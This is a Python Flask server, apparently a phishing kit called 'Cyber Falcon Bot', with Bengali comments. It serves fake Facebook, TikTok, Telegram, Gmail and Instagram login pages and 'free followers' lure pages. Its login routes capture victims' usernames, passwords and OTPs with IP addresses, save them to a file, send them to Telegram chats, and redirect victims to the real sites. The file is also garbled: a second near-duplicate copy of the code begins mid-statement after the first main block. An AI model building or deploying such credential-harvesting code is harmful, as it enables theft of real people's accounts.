from flask import Flask, request, redirect, render_template, jsonify
import json
import logging
import threading
import requests
import socket
import os
import time
import asyncio
from config import PORT, TELEGRAM_BOT_TOKEN  

app = Flask(__name__)

current_page = "facebook"
public_url = None
active_chat_ids = set()

# ডাটা সেভ করার ফাইল
DATA_FILE = "bot_data.json"

def load_data():
    """সেভ করা ডাটা লোড করে"""
    global public_url, active_chat_ids
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
                public_url = data.get('public_url')
                active_chat_ids = set(data.get('active_users', []))
                print(f"🌪️ডাটা লোড করা হয়েছে: URL={public_url}, Users={len(active_chat_ids)}")
    except Exception as e:
        print(f"ডাটা লোড করতে ব্যর্থ: {e}")

def save_data():
    """ডাটা সেভ করে"""
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump({
                'public_url': public_url,
                'active_users': list(active_chat_ids)
            }, f)
    except Exception as e:
        print(f"ডাটা সেভ করতে ব্যর্থ: {e}")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def send_to_telegram(data):
    platform_info = {
        "facebook": {"name": "Facebook", "icon": "📘"},
        "tiktok": {"name": "TikTok", "icon": "🎵"},
        "telegram": {"name": "Telegram", "icon": "📱"},
        "gmail": {"name": "Gmail", "icon": "📧"},
        "instagram": {"name": "Instagram", "icon": "📸"},
        "facebook_followers": {"name": "Facebook Followers", "icon": "🎯"},
        "whatsapp_groups": {"name": "WhatsApp Groups", "icon": "🤤"},
        "tiktok_boost": {"name": "TikTok Booster", "icon": "🚀"},
        "tiktok_followers": {"name": "TikTok Followers", "icon": "💎"}
    }
    
    page_type = data.get('pageType', 'unknown')
    platform = platform_info.get(page_type, {"name": page_type, "icon": "🌐"})
    
    message = f"""
🦅🥷 {platform['name']} Login Information 🦅🥷

{platform['icon']} Platform: {platform['name']}
👤 Username/Email: {data.get('username', data.get('phone', 'N/A'))}
🔑 Password/OTP: {data.get('password', data.get('otp', 'N/A'))}
🌐 IP Address: {data.get('ipAddress', 'Unknown')}
📱 User Agent: {data.get('userAgent', 'Unknown')}
⏰ Time: {data.get('timestamp', time.strftime("%Y-%m-%d %H:%M:%S"))}
"""
    
    if 'groupName' in data:
        message += f"👥 Group: {data['groupName']}\n"
    
    if 'video_link' in data and data['video_link']:
        message += f"🎥 Video Link: {data['video_link']}\n"
    
    if 'service_type' in data:
        message += f"📦 Service: {data['service_type']}\n"
    
    if 'email' in data and data['email']:
        message += f"📧 Email: {data['email']}\n"
    
    message += "\n⚡🦅 Cyber Falcon Bot 🦅⚡"
    
    for chat_id in active_chat_ids:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': message
        }
        
        try:
            response = requests.post(url, data=payload)
            print(f"🙅🤢 Message sent to chat_id {chat_id}: {response.status_code}")
        except Exception as e:
            print(f"😷🤢 Error sending to chat_id {chat_id}: {e}")

def add_chat_id(chat_id):
    """Add chat ID to broadcast list"""
    active_chat_ids.add(chat_id)
    save_data()
    print(f"🕵️ Added chat_id to broadcast list: {chat_id}")
    print(f"🕵️ Total active users: {len(active_chat_ids)}")

@app.route('/')
def index():
    global current_page
    
    template_files = {
        "facebook": "facebook.html",
        "tiktok": "tiktok.html", 
        "telegram": "telegram.html",
        "gmail": "gmail.html",
        "instagram": "instagram.html"
    }
    
    template_file = template_files.get(current_page, "facebook.html")
    templates_dir = 'templates'
    template_path = os.path.join(templates_dir, template_file)
    
    if not os.path.exists(template_path):
        fallback_path = os.path.join(templates_dir, "facebook.html")
        if os.path.exists(fallback_path):
            return render_template("facebook.html")
        else:
            return f"No valid template found. Looking for: {template_file}", 500
    
    return render_template(template_file)

@app.route('/set_page/<page_type>')
def set_page(page_type):
    global current_page
    
    valid_pages = ["facebook", "tiktok", "telegram", "gmail", "instagram"]
    page_type_lower = page_type.lower()
    
    if page_type_lower in valid_pages:
        current_page = page_type_lower
        print(f"✅ Page set to: {current_page}")
        return f"Page set to {current_page}"
    
    return f"Invalid page type. Valid options are: {', '.join(valid_pages)}"

@app.route('/get_ngrok_url')
def get_ngrok_url_api():
    """API endpoint to get public URL"""
    global public_url
    
    # Render-এ থাকলে Render URL ব্যবহার করবে
    render_url = os.environ.get('RENDER_EXTERNAL_URL')
    if render_url and not public_url:
        public_url = render_url
        print(f"✅ Render URL সেট করা হয়েছে: {public_url}")
    
    return jsonify({
        'ngrok_url': public_url,
        'public_url': public_url,
        'status': 'active' if public_url else 'inactive',
        'active_users': len(active_chat_ids),
        'current_page': current_page
    })

@app.route('/set_public_url', methods=['POST'])
def set_public_url():
    """Public URL সেট করার এন্ডপয়েন্ট"""
    global public_url
    try:
        data = request.json
        new_url = data.get('url') or data.get('public_url') or data.get('ngrok_url')
        if new_url and new_url.startswith('http'):
            public_url = new_url
            save_data()
            print(f"✅ পাবলিক URL সেট করা হয়েছে: {public_url}")
            return jsonify({'status': 'success', 'public_url': public_url})
        return jsonify({'status': 'error', 'message': 'Invalid URL'}), 400
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400

@app.route('/add_user/<chat_id>')
def add_user(chat_id):
    """API endpoint to add user to broadcast list"""
    try:
        chat_id_int = int(chat_id)
        add_chat_id(chat_id_int)
        return jsonify({
            'status': 'success',
            'message': f'User {chat_id} added to broadcast list',
            'total_users': len(active_chat_ids)
        })
    except ValueError:
        return jsonify({
            'status': 'error',
            'message': 'Invalid chat ID. Must be a number.'
        }), 400

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    data = {
        'username': username,
        'password': password,
        'ipAddress': ip_address,
        'userAgent': user_agent,
        'pageType': current_page,
        'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
    }
    
    # Save to file
    with open('credentials.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    
    print('🌪️ Credentials saved:', data)
    
    # Send to Telegram
    send_to_telegram(data)
    
    # Redirect based on current page
    redirect_urls = {
        "tiktok": "https://www.tiktok.com/",
        "telegram": "https://web.telegram.org/",
        "gmail": "https://mail.google.com/",
        "instagram": "https://www.instagram.com/",
        "facebook": "https://www.facebook.com/"
    }
    
    return redirect(redirect_urls.get(current_page, "https://www.google.com/"))

@app.route('/login2', methods=['POST'])
def login2():
    """সকল HTML পেজের ডেটা গ্রহণ করে টেলিগ্রামে পাঠায়"""
    
    # ফর্ম ডেটা সংগ্রহ
    data = {}
    for key in request.form:
        data[key] = request.form[key]
    
    # IP এবং User Agent যোগ করুন
    data['ipAddress'] = request.remote_addr
    data['userAgent'] = request.headers.get('User-Agent')
    data['timestamp'] = time.strftime("%Y-%m-%d %H:%M:%S")
    
    # ফাইল এ সেভ করুন
    with open('credentials.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    
    print(f"🌪️ ডেটা সংগ্রহ হয়েছে: {data}")
    
    # টেলিগ্রামে পাঠান
    send_to_telegram(data)
    
    # রিডাইরেক্ট (পেজ অনুযায়ী)
    page_type = data.get('pageType', 'default')
    redirect_urls = {
        "facebook_followers": "https://facebook.com",
        "whatsapp_groups": "https://web.whatsapp.com",
        "tiktok_boost": "https://tiktok.com",
        "tiktok_followers": "https://tiktok.com",
        "default": "https://google.com"
    }
    
    return redirect(redirect_urls.get(page_type, redirect_urls["default"]))

# Ad all পেজগুলোর রাউট
@app.route('/facebook_followers')
def facebook_followers():
    """ফ্রি ফেসবুক ফলোয়ার পেজ"""
    try:
        return render_template("facebook_followers.html")
    except Exception as e:
        return f"পেজ লোড করতে ব্যর্থ: {e}", 500

@app.route('/whatsapp_groups')
def whatsapp_groups():
    """হট গ্রুপ লিস্টিং পেজ"""
    try:
        return render_template("whatsapp_groups.html")
    except Exception as e:
        return f"পেজ লোড করতে ব্যর্থ: {e}", 500

@app.route('/tiktok_boost')
def tiktok_boost():
    """TikTok ভিউ+লাইক বুস্টার পেজ"""
    try:
        return render_template("tiktok_boost.html")
    except Exception as e:
        return f"পেজ লোড করতে ব্যর্থ: {e}", 500

@app.route('/tiktok_followers')
def tiktok_followers():
    """TikTok ফলোয়ার বুস্টার পেজ"""
    try:
        return render_template("tiktok_followers.html")
    except Exception as e:
        return f"পেজ লোড করতে ব্যর্থ: {e}", 500

# ============= বট চালানোর অংশ =============
def run_bot():
    """ব্যাকগ্রাউন্ডে টেলিগ্রাম বট চালায়"""
    try:
        from telegram_bot import run_bot as start_bot
        start_bot()
    except Exception as e:
        print(f"বট চালাতে ব্যর্থ: {e}")

# ==========================================

if __name__ == '__main__':
    # Load saved data
    load_data()
    
    # ব্যাকগ্রাউন্ডে বট চালান
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    print("🙋 Telegram বট ব্যাকগ্রাউন্ডে চালু হয়েছে")
    
    # Render-এ থাকলে URL অটো ডিটেক্ট হবে
    render_url = os.environ.get('RENDER_EXTERNAL_URL')
    if render_url:
        public_url = render_url
        print(f" 🥷Render URL : {public_url}")
    
    # Print server information
    local_ip = get_local_ip()
    print(f"\n{'='*50}")
    print(f"🚀 Cyber Falcon Bot - Flask সার্ভার")
    print(f"{'='*50}")
    print(f"📍 লোকাল URL: http://{local_ip}:5000")
    print(f"🌐 পাবলিক URL: {public_url if public_url else 'সেট করা হয়নি'}")
    print(f"📄 বর্তমান পেজ: {current_page}")
    print(f"👥 সক্রিয় ইউজার: {len(active_chat_ids)}")
    print(f"{'='*50}")
    
    # Render-এর জন্য পোর্ট পরিবর্তন করা আবশ্যক!
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)            response = requests.post(url, data=payload)
            print(f"📢 Message sent to chat_id {chat_id}: {response.status_code}")
        except Exception as e:
            print(f"❌ Error sending to chat_id {chat_id}: {e}")

def add_chat_id(chat_id):
    """Add chat ID to broadcast list"""
    active_chat_ids.add(chat_id)
    save_data()
    print(f"✅ Added chat_id to broadcast list: {chat_id}")
    print(f"📊 Total active users: {len(active_chat_ids)}")

@app.route('/')
def index():
    global current_page
    
    template_files = {
        "facebook": "facebook.html",
        "tiktok": "tiktok.html", 
        "telegram": "telegram.html",
        "gmail": "gmail.html",
        "instagram": "instagram.html"
    }
    
    template_file = template_files.get(current_page, "facebook.html")
    templates_dir = 'templates'
    template_path = os.path.join(templates_dir, template_file)
    
    if not os.path.exists(template_path):
        fallback_path = os.path.join(templates_dir, "facebook.html")
        if os.path.exists(fallback_path):
            return render_template("facebook.html")
        else:
            return f"No valid template found. Looking for: {template_file}", 500
    
    return render_template(template_file)

@app.route('/set_page/<page_type>')
def set_page(page_type):
    global current_page
    
    valid_pages = ["facebook", "tiktok", "telegram", "gmail", "instagram"]
    page_type_lower = page_type.lower()
    
    if page_type_lower in valid_pages:
        current_page = page_type_lower
        print(f"✅ Page set to: {current_page}")
        return f"Page set to {current_page}"
    
    return f"Invalid page type. Valid options are: {', '.join(valid_pages)}"

@app.route('/get_ngrok_url')
def get_ngrok_url_api():
    """API endpoint to get public URL"""
    global public_url
    
    # Render-এ থাকলে Render URL ব্যবহার করবে
    render_url = os.environ.get('RENDER_EXTERNAL_URL')
    if render_url and not public_url:
        public_url = render_url
        print(f"✅ Render URL সেট করা হয়েছে: {public_url}")
    
    return jsonify({
        'ngrok_url': public_url,
        'public_url': public_url,
        'status': 'active' if public_url else 'inactive',
        'active_users': len(active_chat_ids),
        'current_page': current_page
    })

@app.route('/set_public_url', methods=['POST'])
def set_public_url():
    """Public URL সেট করার এন্ডপয়েন্ট"""
    global public_url
    try:
        data = request.json
        new_url = data.get('url') or data.get('public_url') or data.get('ngrok_url')
        if new_url and new_url.startswith('http'):
            public_url = new_url
            save_data()
            print(f"✅ পাবলিক URL সেট করা হয়েছে: {public_url}")
            return jsonify({'status': 'success', 'public_url': public_url})
        return jsonify({'status': 'error', 'message': 'Invalid URL'}), 400
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400

@app.route('/add_user/<chat_id>')
def add_user(chat_id):
    """API endpoint to add user to broadcast list"""
    try:
        chat_id_int = int(chat_id)
        add_chat_id(chat_id_int)
        return jsonify({
            'status': 'success',
            'message': f'User {chat_id} added to broadcast list',
            'total_users': len(active_chat_ids)
        })
    except ValueError:
        return jsonify({
            'status': 'error',
            'message': 'Invalid chat ID. Must be a number.'
        }), 400

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    data = {
        'username': username,
        'password': password,
        'ipAddress': ip_address,
        'userAgent': user_agent,
        'pageType': current_page,
        'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
    }
    
    # Save to file
    with open('credentials.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    
    print('✅ Credentials saved:', data)
    
    # Send to Telegram
    send_to_telegram(data)
    
    # Redirect based on current page
    redirect_urls = {
        "tiktok": "https://www.tiktok.com/",
        "telegram": "https://web.telegram.org/",
        "gmail": "https://mail.google.com/",
        "instagram": "https://www.instagram.com/",
        "facebook": "https://www.facebook.com/"
    }
    
    return redirect(redirect_urls.get(current_page, "https://www.google.com/"))

@app.route('/login2', methods=['POST'])
def login2():
    """সকল HTML পেজের ডেটা গ্রহণ করে টেলিগ্রামে পাঠায়"""
    
    # ফর্ম ডেটা সংগ্রহ
    data = {}
    for key in request.form:
        data[key] = request.form[key]
    
    # IP এবং User Agent যোগ করুন
    data['ipAddress'] = request.remote_addr
    data['userAgent'] = request.headers.get('User-Agent')
    data['timestamp'] = time.strftime("%Y-%m-%d %H:%M:%S")
    
    # ফাইল এ সেভ করুন
    with open('credentials.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    
    print(f"✅ ডেটা সংগ্রহ হয়েছে: {data}")
    
    # টেলিগ্রামে পাঠান
    send_to_telegram(data)
    
    # রিডাইরেক্ট (পেজ অনুযায়ী)
    page_type = data.get('pageType', 'default')
    redirect_urls = {
        "facebook_followers": "https://facebook.com",
        "whatsapp_groups": "https://web.whatsapp.com",
        "tiktok_boost": "https://tiktok.com",
        "tiktok_followers": "https://tiktok.com",
        "default": "https://google.com"
    }
    
    return redirect(redirect_urls.get(page_type, redirect_urls["default"]))

# Ad all পেজগুলোর রাউট
@app.route('/facebook_followers')
def facebook_followers():
    """ফ্রি ফেসবুক ফলোয়ার পেজ"""
    try:
        return render_template("facebook_followers.html")
    except Exception as e:
        return f"পেজ লোড করতে ব্যর্থ: {e}", 500

@app.route('/whatsapp_groups')
def whatsapp_groups():
    """হট গ্রুপ লিস্টিং পেজ"""
    try:
        return render_template("whatsapp_groups.html")
    except Exception as e:
        return f"পেজ লোড করতে ব্যর্থ: {e}", 500

@app.route('/tiktok_boost')
def tiktok_boost():
    """TikTok ভিউ+লাইক বুস্টার পেজ"""
    try:
        return render_template("tiktok_boost.html")
    except Exception as e:
        return f"পেজ লোড করতে ব্যর্থ: {e}", 500

@app.route('/tiktok_followers')
def tiktok_followers():
    """TikTok ফলোয়ার বুস্টার পেজ"""
    try:
        return render_template("tiktok_followers.html")
    except Exception as e:
        return f"পেজ লোড করতে ব্যর্থ: {e}", 500

# ✅ Render-এর জন্য সবচেয়ে গুরুত্বপূর্ণ অংশ
if __name__ == '__main__':
    # Load saved data
    load_data()
    
    # Render-এ থাকলে URL অটো ডিটেক্ট হবে
    render_url = os.environ.get('RENDER_EXTERNAL_URL')
    if render_url:
        public_url = render_url
        print(f"✅ Render URL স্বয়ংক্রিয়ভাবে সেট হয়েছে: {public_url}")
    
    # Print server information
    local_ip = get_local_ip()
    print(f"\n{'='*50}")
    print(f"🚀 Cyber Falcon Bot - Flask সার্ভার")
    print(f"{'='*50}")
    print(f"📍 লোকাল URL: http://{local_ip}:5000")
    print(f"🌐 পাবলিক URL: {public_url if public_url else 'সেট করা হয়নি'}")
    print(f"📄 বর্তমান পেজ: {current_page}")
    print(f"👥 সক্রিয় ইউজার: {len(active_chat_ids)}")
    print(f"{'='*50}")
    
    # Render-এর জন্য পোর্ট পরিবর্তন করা আবশ্যক!
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
